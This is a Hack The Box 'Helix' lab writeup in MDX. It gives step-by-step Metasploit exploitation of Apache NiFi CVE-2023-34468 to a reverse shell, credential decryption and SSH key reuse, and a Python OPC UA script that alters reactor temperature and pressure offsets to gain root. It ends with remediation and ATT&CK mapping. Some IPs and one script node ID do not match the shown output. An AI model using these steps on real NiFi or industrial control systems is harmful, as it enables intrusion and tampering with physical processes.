@@ -1,0 +1,590 @@
+export const frontmatter = {
+  title: "Hack The Box Helix Machine Writeup",
+  slug: "hack-the-box-helix-machine-writeup",
+  category: "HTB Machine",
+  tags: "apache-nifi, cve-2023-34468, opc-ua, ics",
+  description:
+    "Complete walkthrough of the Hack The Box Helix machine, covering Apache NiFi RCE via CVE-2023-34468, credential extraction, SSH key reuse, internal OPC UA enumeration, reactor parameter manipulation, and privilege escalation to root.",
+  date: "2026-08-09",
+};
+
+export const metadata = {
+  title:
+    "Hack The Box Helix Writeup | Apache NiFi RCE, OPC UA & ICS Privilege Escalation | loxcalhost",
+  description:
+    "Step-by-step Hack The Box Helix writeup covering Apache NiFi CVE-2023-34468 exploitation, credential extraction, SSH key reuse, internal OPC UA enumeration, reactor parameter manipulation, and privilege escalation to root through a privileged maintenance console.",
+};
+
+## Introduction
+
+Helix was built to control critical infrastructure, but like most complex systems, its weakest point wasn’t the machinery — it was the assumptions behind it. A vulnerable Apache NiFi instance opened the first door, exposed credentials opened the next, and an industrial OPC UA environment turned privilege escalation into a matter of manipulating reactor conditions. In the end, the system didn’t fail because it was noisy; it failed because every layer trusted the one beneath it.
+
+## Overview
+
+- **Target:** Helix (Critical Infrastructure / IT-OT environment)
+- **Vulnerabilities Exploited:** Unauthenticated RCE in Apache NiFi (CVE-2023-34468), Insecure Credential Storage, and Unauthenticated OPC UA Endpoints.
+- **Path to Root:** Initial access was gained by exploiting a known vulnerability in an exposed Apache NiFi instance. After recovering the master key and decrypting stored credentials, lateral movement was achieved via an exposed SSH backup key. Finally, privilege escalation involved using SSH port forwarding to access an internal industrial network (OPC UA) and manipulating physical reactor parameters (temperature and pressure) to force the system into a privileged maintenance mode, granting root access.
+
+## Attack Chain
+
+- Enumerated the target and discovered the virtual host `flow.helix.htb`
+- Identified an exposed Apache NiFi instance running version `1.21.0`
+- Exploited `CVE-2023-34468` using a modified Metasploit module to gain RCE as user `nifi`
+- Extracted encrypted credentials from `flow.xml.gz`
+- Recovered the NiFi encryption key and decrypted the stored password
+- Enumerated backup files and discovered an exposed SSH private key for user `operator`
+- Authenticated to the system via SSH as `operator`
+- Identified a sudo-allowed maintenance console executable
+- Enumerated internal-only services and discovered an OPC UA industrial control interface
+- Used SSH port forwarding to access the internal Reactor HMI and OPC UA services
+- Manipulated reactor conditions through OPC UA nodes to trigger maintenance mode
+- Executed the privileged maintenance console and obtained a root shell
+- Retrieved the root flag
+
+## Setup
+
+Download the VPN configuration file from the webpage and connect using `sudo openvpn file.ovpn`.
+
+> **NOTE:** Replace `file.ovpn` with your VPN configuration file name.
+
+To check if everything is working fine, we can use:
+```
+ping 10.129.126.131
+```
+
+Output:
+```
+PING 10.129.126.131 (10.129.126.131) 56(84) bytes of data.
+64 bytes from 10.129.230.49: icmp_seq=1 ttl=63 time=421 ms
+64 bytes from 10.129.230.49: icmp_seq=2 ttl=63 time=326 ms
+64 bytes from 10.129.230.49: icmp_seq=3 ttl=63 time=321 ms
+64 bytes from 10.129.230.49: icmp_seq=4 ttl=63 time=464 ms
+^C
+--- 10.129.126.131 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 4005ms
+rtt min/avg/max/mdev = 321.309/389.471/463.610/56.309 ms
+
+```
+
+Upon visiting the IP address in a browser, it redirects to `http://helix.htb`, but the page fails to load.
+
+Add `helix.htb` to `/etc/hosts` with `echo '10.129.126.131	helix.htb' | sudo tee -a /etc/hosts`
+
+> **NOTE:** We need to add an entry to `/etc/hosts` because the domain `helix.htb` is not publicly registered. When you visit the target IP in a browser using this domain, the system attempts to resolve it via public DNS servers. Since the domain does not exist publicly, DNS resolution fails. By adding the IP address and domain to `/etc/hosts`, you create a local mapping, allowing your system to resolve `helix.htb` to the correct IP address without relying on external DNS servers.
+
+## Enumeration
+
+Perform a Nmap full port scan with version detection:
+```
+nmap -sV -p- -T4 10.129.126.131
+```
+
+Output:
+```
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-10 18:39 IST
+Nmap scan report for helix.htb (10.129.126.131)
+Host is up (0.10s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 274.99 seconds
+```
+
+Scan the target with whatweb:
+```
+whatweb http://helix.htb
+```
+
+Output:
+```
+http://helix.htb [200 OK] Country[RESERVED][ZZ], Email[name@company.com], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.126.131], Script, Title[Helix Industries | Industrial Automation & Critical Infrastructure], nginx[1.18.0]
+```
+
+Perform a Gobuster VHOST Scan:
+```
+gobuster vhost -u http://helix.htb -w wordlist.txt
+```
+
+Output:
+```
+===============================================================
+Gobuster v3.8
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                       http://helix.htb
+[+] Method:                    GET
+[+] Threads:                   10
+[+] Wordlist:                  wordlist.txt
+[+] User Agent:                gobuster/3.8
+[+] Timeout:                   10s
+[+] Append Domain:             true
+[+] Exclude Hostname Length:   false
+===============================================================
+Starting gobuster in VHOST enumeration mode
+===============================================================
+flow.helix.htb Status: 200 [Size: 1068]
+Progress: 20000 / 20000 (100.00%)
+===============================================================
+Finished
+```
+
+> The wordlist used for subdomain enumeration can be found [here](https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-20000.txt).
+
+The scan revealed a virtual host, `flow.helix.htb`, which was not resolvable by default. To access it locally, the domain was added to `/etc/hosts` using the following command:
+```
+echo '10.129.126.131	flow.helix.htb' | sudo tee -a /etc/hosts
+```
+
+**Note:** Directory and file enumeration failed to reveal any interesting or accessible resources.
+
+Accessing `http://flow.helix.htb` resulted in an automatic redirect to `http://flow.helix.htb/nifi/`, indicating that the application is hosted under the `/nifi/` path.
+
+The web application was identified as running **Apache NiFi v1.21.0**, which is known to be affected by **CVE-2023-34468**, as documented in the [official advisory](https://github.com/advisories/GHSA-xm2m-2q6h-22jw) . A proof-of-concept for this vulnerability is available [here](https://github.com/mbadanoiu/CVE-2023-34468), which includes a Metasploit module for exploitation. For manual exploitation details, refer [this](https://github.com/mbadanoiu/CVE-2023-34468/blob/main/Apache%20NiFi%20-%20CVE-2023-34468.pdf)
+
+**Vulnerability Description:** The DBCPConnectionPool and HikariCPConnectionPool Controller Services in Apache NiFi versions 0.0.2 through 1.21.0 contain a critical vulnerability that allows an authenticated user to achieve Remote Code Execution (RCE). The flaw exists because the application insufficiently validates the Database Connection URL property. An attacker with privileges to configure controller services can supply a crafted H2 JDBC Database URL containing embedded initialization commands. When the connection pool is enabled and the service opens the connection, the H2 database engine evaluates the malicious directive, executing arbitrary system commands with the privileges of the NiFi process.
+
+## Foothold
+
+To exploit this CVE, the Metasploit module `linux/http/apache_nifi_h2_rce` is used. However, before execution, minor modifications are required to align the module with the target environment.
+
+First, locate the module using:
+```
+find / -name apache_nifi_h2_rce.rb 2>/dev/null
+```
+
+This identifies the module path (example output):
+```
+/usr/share/metasploit-framework/modules/exploits/linux/http/apache_nifi_h2_rce.rb
+```
+After locating the module, update the hardcoded H2 library path using sed to match the target’s installation directory:
+```
+sudo sed -i 's#/opt/nifi/nifi-toolkit-current/lib/h2-2.1.214.jar#/opt/nifi-1.21.0/lib/h2-2.1.214.jar#g' /usr/share/metasploit-framework/modules/exploits/linux/http/apache_nifi_h2_rce.rb
+```
+
+> **Note:** Ensure the Metasploit module path matches the one on your system before applying the modification.
+
+Start Metasploit using:
+```
+msfconsole
+```
+
+Once loaded, reload all modules to ensure the updated exploit is recognized:
+```
+reload_all
+```
+
+Next, load the Apache NiFi exploit module:
+```
+use exploit/linux/http/apache_nifi_h2_rce
+```
+
+Configure the required options:
+```
+set RHOSTS 10.129.230.127
+set RPORT 80
+set VHOST flow.helix.htb
+set LHOST 10.10.14.39
+set SSL false
+```
+
+Run the exploit:
+```
+run
+```
+
+Upon execution, a reverse shell is obtained:
+```
+[*] Started reverse TCP handler on 10.10.14.39:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target appears to be vulnerable. Apache NiFi instance does not support logins
+[+] DB Connection Pool Created successfully
+[+] DB Connection Pool Start sent successfully
+[+] Processor Start sent successfully
+[*] Command shell session 1 opened (10.10.14.39:4444 -> 10.129.230.127:59204) at 2026-05-14 21:44:49 +0530
+```
+
+List active sessions:
+```
+sessions -i
+```
+
+Output:
+```
+Active sessions
+===============
+
+  Id  Name  Type            Information  Connection
+  --  ----  ----            -----------  ----------
+  1         shell cmd/unix               10.10.14.39:4444 -> 10.129.230.127:59204 (10.129.230.127)
+```
+
+Interact with the session:
+```
+sessions -i 1
+```
+
+Finally, upgrade to a fully interactive shell:
+```
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+Now you have shell access as user `nifi`
+
+## Lateral Movement
+
+The `flow.xml.gz` file located under the `conf` directory contains sensitive configuration data, including encrypted credentials. The file can be inspected by decompressing it with:
+```
+zcat flow.xml.gz
+```
+
+Inside the output, credentials are exposed, including an encrypted password:
+```
+...<SNIP>...
+      <property>                                                                                                                                                   
+        <name>Database User</name>                                                                                                                                 
+        <value>operator</value>                                                                                                                                    
+      </property>                                                                                                                                                  
+      <property>                                                                                                                                                   
+        <name>Password</name>                                                                                                                                      
+        <value>enc{▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇}</value>                                   
+      </property>    
+...<SNIP>...
+```
+
+The encryption key can be recovered from `nifi.properties` using:
+```
+grep "nifi.sensitive.props.key=" nifi.properties
+```
+
+Output:
+```
+nifi.sensitive.props.key=TUHh+YHA30zmdlcA8xq/elNBLPkO03Nl
+```
+
+The encryption algorithm can also be identified from the same file:
+```
+grep "nifi.sensitive.props.algorithm=" nifi.properties
+```
+
+Output:
+```
+nifi.sensitive.props.algorithm=NIFI_PBKDF2_AES_GCM_256
+```
+
+The encrypted password can then be decrypted using [nifi-decrypt](https://github.com/redaxn/nifi-decrypt):
+
+Clone the repository:
+```
+git clone https://github.com/redaxn/nifi-decrypt
+```
+
+Navigate to the project directory and build the fat JAR:
+```
+cd nifi-decrypt
+mvn clean package
+```
+
+Decrypt the password using the recovered key and algorithm:
+```
+java -jar target/nifi-decrypt-1.0.jar \
+    --key 'TUHh+YHA30zmdlcA8xq/elNBLPkO03Nl' \
+    --algorithm NIFI_PBKDF2_AES_GCM_256 \
+    --value 'enc{▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇}'
+```
+
+Which successfully returns the decrypted password:
+```
+▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
+```
+
+Further enumeration for backup files reveals a private key backup:
+```
+find / -name "*.bak" 2>/dev/null
+```
+
+This identifies the following file:
+```
+/opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak
+```
+
+Inspecting the file shows an SSH private key:
+```
+cat /opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak
+```
+
+Output:
+```
+-----BEGIN OPENSSH PRIVATE KEY-----
+▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
+▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
+▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
+▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
+▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
+-----END OPENSSH PRIVATE KEY-----
+```
+
+This key can be used to authenticate via SSH as the `operator` user.
+
+To use the extracted SSH private key, first save it locally and then set the correct permissions.
+```
+chmod 600 operator_key
+```
+
+Authenticate as the `operator` user using the recovered SSH private key:
+```
+ssh -i operator_key operator@10.129.126.131
+```
+
+Once authenticated as the `operator` user, retrieve the user flag:
+```
+cat /home/operator/user.txt
+```
+
+Output:
+```
+▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
+```
+
+## Privilege Escalation
+
+Running `sudo -l` reveals the following sudo privileges for the operator user:
+```
+Matching Defaults entries for operator on helix:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User operator may run the following commands on helix:
+    (root) NOPASSWD: /usr/local/sbin/helix-maint-console
+```
+
+This indicates that `/usr/local/sbin/helix-maint-console` can be executed as root without requiring a password.
+
+Attempting to run the binary directly:
+```
+sudo /usr/local/sbin/helix-maint-console
+```
+
+Results in:
+```
+Maintenance window CLOSED.
+```
+
+To better understand the environment, enumerate listening services using:
+```
+ss -tulnp
+```
+
+Output:
+```
+Netid          State           Recv-Q          Send-Q                          Local Address:Port                      Peer Address:Port          Process          
+udp            UNCONN          0               0                               127.0.0.53%lo:53                             0.0.0.0:*                              
+udp            UNCONN          0               0                                     0.0.0.0:68                             0.0.0.0:*                              
+tcp            LISTEN          0               100                                 127.0.0.1:4840                           0.0.0.0:*                              
+tcp            LISTEN          0               5                                     0.0.0.0:8000                           0.0.0.0:*                              
+tcp            LISTEN          0               4096                            127.0.0.53%lo:53                             0.0.0.0:*                              
+tcp            LISTEN          0               128                                 127.0.0.1:8081                           0.0.0.0:*                              
+tcp            LISTEN          0               50                                  127.0.0.1:8080                           0.0.0.0:*                              
+tcp            LISTEN          0               511                                   0.0.0.0:80                             0.0.0.0:*                              
+tcp            LISTEN          0               128                                   0.0.0.0:22                             0.0.0.0:*                              
+tcp            LISTEN          0               50                                  127.0.0.1:36067                          0.0.0.0:*                              
+tcp            LISTEN          0               128                                      [::]:22                                [::]:*                              
+tcp            LISTEN          0               50                         [::ffff:127.0.0.1]:40711                                *:*         
+```
+
+Several interesting services are bound locally, including ports `8080`, `8081`, and `4840`. These can be accessed externally using SSH port forwarding:
+```
+ssh -i operator_key -L 8081:127.0.0.1:8081 -L 4840:127.0.0.1:4840 operator@10.129.126.131
+```
+
+Visiting `http://localhost:8081/` reveals a `Reactor HMI` interface used for monitoring reactor conditions.
+
+The interface indicates that a privileged maintenance window is opened only when hazardous reactor conditions are detected, specifically:
+- Temperature ≥ 295°C
+- Pressure ≥ 73 bar
+- While still remaining below trip thresholds
+
+The application also exposes an internal OPC UA endpoint:
+```
+opc.tcp://127.0.0.1:4840/helix/
+```
+
+OPC UA (Open Platform Communications Unified Architecture) is an industrial communication protocol used to exchange data between PLCs, HMIs, SCADA, and other automation systems securely and reliably. It is mainly used for real-time monitoring, control, and integration of industrial equipment.
+
+First, install the required Python library using the following command:
+```
+pip3 install opcua
+```
+
+To enumerate OPC UA nodes, you can use the following Python script:
+```
+from opcua import Client                                                                                                                                           
+
+url = "opc.tcp://127.0.0.1:4840/helix/"
+client = Client(url, timeout=10)
+
+try:
+    client.connect()
+    print("[+] Connected to OPC UA Server!")
+
+    def print_tree(node, level=0):
+        try:
+            name = node.get_browse_name().Name
+            node_id = node.nodeid
+             
+            if hasattr(node_id, 'Identifier') and node_id.Identifier == 2253:
+                return
+
+            print("  " * level + f"- {name} (ID: {node_id})")
+             
+            for child in node.get_children():
+                print_tree(child, level + 1)
+                 
+        except Exception:
+            pass # Ignore errors and keep going
+
+    print("\n[*] Scanning for custom nodes...\n")
+    objects = client.get_objects_node()
+    print_tree(objects)
+
+finally:
+    client.disconnect()
+```
+
+Output:
+```
+[+] Connected to OPC UA Server!                                                                                                                                   
+                                                                                                                                                                  
+[*] Scanning for custom nodes...
+
+- Objects (ID: TwoByteNodeId(i=85))
+  - Locations (ID: NumericNodeId(i=31915))
+  - Aliases (ID: NumericNodeId(i=23470)) 
+    - FindAlias (ID: NumericNodeId(i=23476))
+      - InputArguments (ID: NumericNodeId(i=23477))
+      - OutputArguments (ID: NumericNodeId(i=23478))
+    - LastChange (ID: NumericNodeId(i=32852))
+    - TagVariables (ID: NumericNodeId(i=23479))
+      - FindAlias (ID: NumericNodeId(i=23485))
+        - InputArguments (ID: NumericNodeId(i=23486))
+        - OutputArguments (ID: NumericNodeId(i=23487))
+    - Topics (ID: NumericNodeId(i=23488))
+      - FindAlias (ID: NumericNodeId(i=23494))
+        - InputArguments (ID: NumericNodeId(i=23495))
+        - OutputArguments (ID: NumericNodeId(i=23496))
+  - Plant (ID: FourByteNodeId(ns=2;i=1)) 
+    - Reactor (ID: FourByteNodeId(ns=2;i=2))
+      - TemperatureRaw (ID: FourByteNodeId(ns=2;i=3))
+      - Temperature (ID: FourByteNodeId(ns=2;i=4))
+      - Pressure (ID: FourByteNodeId(ns=2;i=5))
+      - CalibrationOffset (ID: FourByteNodeId(ns=2;i=6))
+    - Safety (ID: FourByteNodeId(ns=2;i=7))
+      - RodsInserted (ID: FourByteNodeId(ns=2;i=8))
+      - EmergencyCooling (ID: FourByteNodeId(ns=2;i=9))
+      - TripActive (ID: FourByteNodeId(ns=2;i=10))
+    - Control (ID: FourByteNodeId(ns=2;i=11))
+      - Mode (ID: FourByteNodeId(ns=2;i=12))
+      - TestOverride (ID: FourByteNodeId(ns=2;i=13))
+      - ResetTrip (ID: FourByteNodeId(ns=2;i=14))
+```
+
+> **NOTE:** This script only returns non-default node IDs. If a node belongs to the default `Server` folder (ID `2253`), it is skipped.
+
+After identifying the relevant nodes, the following script can be used to manipulate reactor values and force the system into maintenance mode:
+```
+import time
+from opcua import Client, ua
+
+url = "opc.tcp://127.0.0.1:4840/helix/"
+client = Client(url)
+
+try:
+    client.connect()
+    print("[+] Connected to Helix OPC UA Server")
+
+    node_mode = client.get_node("ns=2;i=12")
+    node_override = client.get_node("ns=2;i=13")
+    node_t_offset = client.get_node("ns=2;i=6")
+    node_p_offset = client.get_node("ns=2;i=7")
+    node_temp_curr = client.get_node("ns=2;i=4")
+    node_pres_curr = client.get_node("ns=2;i=5")
+
+    print("[*] Initializing Maintenance Mode...")
+    node_mode.set_value(ua.DataValue(ua.Variant("MAINTENANCE", ua.VariantType.String)))
+    node_override.set_value(ua.DataValue(ua.Variant(True, ua.VariantType.Boolean)))
+
+    t_offset = 14.0
+    p_offset = 0.0
+
+    print("[*] Synchronizing Temperature and Pressure...")
+    
+    while True:
+        # Read current physical values
+        val_t = node_temp_curr.get_value()
+        val_p = node_pres_curr.get_value()
+        
+        print(f"Current Status -> Temp: {val_t:.2f}°C | Pres: {val_p:.2f} bar | T-Off: {t_offset} | P-Off: {p_offset}")
+        
+        if val_t < 295:
+            t_offset += 0.5
+        elif val_t > 299:
+            t_offset -= 0.5
+            
+        if val_p < 70:
+            p_offset += 0.5
+        elif val_p > 72:
+            p_offset -= 0.5
+
+        node_t_offset.set_value(ua.DataValue(ua.Variant(t_offset, ua.VariantType.Double)))
+        node_p_offset.set_value(ua.DataValue(ua.Variant(p_offset, ua.VariantType.Double)))
+
+        time.sleep(1)
+
+except Exception as e:
+    print(f"[-] Error: {e}")
+finally:
+    client.disconnect()
+    print("[-] Disconnected")
+```
+
+Once the reactor enters maintenance mode, privileged access becomes available through the maintenance console:
+```
+sudo /usr/local/sbin/helix-maint-console
+```
+
+Output:
+```
+[+] Privileged maintenance access granted
+[!] Window expires in 119 seconds
+[!] Session will be terminated automatically
+root@helix:/home/operator# 
+```
+
+Finally, retrieve the root flag:
+```
+cat /root/root.txt
+```
+
+Output:
+```
+▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
+```
+
+## Remediation & Recommendations
+
+- **Apache NiFi:** Upgrade Apache NiFi to version 1.22.0 or later to patch CVE-2023-34468. Enforce strong authentication and avoid exposing the NiFi web interface to untrusted networks.
+- **Credential Management:** Rotate the exposed SSH keys. Sensitive backup files (.bak) should not be stored in world-readable web or application directories.
+- **OT/ICS Segmentation:** The OPC UA endpoint and Reactor HMI should be strictly segmented from the IT network and the maintenance console. Implement the Purdue Model for ICS security to ensure that compromised IT assets cannot directly manipulate Level 1/Level 2 OT devices.
+- **Principle of Least Privilege:** Review the sudo permissions for the operator user. The maintenance console should ideally require multi-factor authentication or an explicit break-glass procedure rather than a passwordless sudo execution.
+
+## MITRE ATT&CK Mapping
+
+To provide actionable threat intelligence, the techniques used to compromise the Helix environment have been mapped to the MITRE ATT&CK framework, including specific ICS tactics:
+
+- **T1190 - Exploit Public-Facing Application:** Exploited CVE-2023-34468 in Apache NiFi for initial access.
+- **T1552 - Unsecured Credentials:** Decrypted database passwords from `flow.xml.gz` and discovered a `.bak` file containing the operator's SSH private key.
+- **T1021.004 - Remote Services: SSH:** Used local port forwarding via SSH to pivot into the internal network and access the isolated Reactor HMI and OPC UA endpoints.
+- **T0836 - Modify Parameter (ICS):** Sent unauthorized values to the OPC UA server to manipulate the temperature and pressure offsets.
+- **T0827 - Loss of Control (ICS):** Forced the operational technology (OT) environment into an unintended state (Maintenance Mode) to exploit the IT environment.
